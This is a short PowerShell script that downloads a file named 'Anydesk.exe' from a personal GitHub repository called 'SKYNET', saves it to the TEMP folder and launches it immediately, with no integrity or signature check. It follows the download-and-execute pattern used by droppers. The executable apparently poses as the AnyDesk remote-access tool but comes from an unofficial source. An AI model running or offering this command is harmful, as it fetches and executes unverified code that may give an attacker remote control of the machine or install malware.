$url = "https://raw.githubusercontent.com/kittipatseepakdee-eng/SKYNET/refs/heads/main/Anydesk.exe"
$file = "$env:TEMP\Anydesk.exe"

Invoke-WebRequest $url -OutFile $file
Start-Process $file
